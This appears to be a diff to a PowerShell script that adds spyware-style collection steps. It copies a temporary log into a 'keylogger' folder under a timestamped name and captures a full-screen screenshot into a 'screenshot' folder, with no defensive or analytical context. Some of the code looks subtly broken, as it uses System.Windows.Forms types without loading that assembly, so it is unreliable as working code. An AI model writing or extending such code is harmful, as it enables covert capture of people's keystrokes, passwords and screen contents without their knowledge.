@@ -35,3 +35,29 @@ foreach ($dirName in $directories) {
         Write-Output "Directory already exists: $fullPath"
     }
 }
+
+$LogFile = "$env:TEMP\Log.tmp"
+$currentDateTime = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
+$KeyLogFile = "$dir\keylogger\$currentDateTime.txt"
+Copy-Item -Path $LogFile -Destination $KeyLogFile -Force
+
+# Define the path and filename for the screenshot
+$screenshotPath = "$dir\screenshot\$currentDateTime.png"
+
+# Create a new bitmap object for the screenshot
+Add-Type -AssemblyName System.Drawing
+
+# Capture the screen
+$bitmap = New-Object System.Drawing.Bitmap -ArgumentList [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
+$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphics.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size)
+
+# Save the screenshot to the specified path
+$bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
+
+# Clean up
+$graphics.Dispose()
+$bitmap.Dispose()
+
+# Output the path of the saved screenshot
+Write-Output "Screenshot saved to: $screenshotPath"
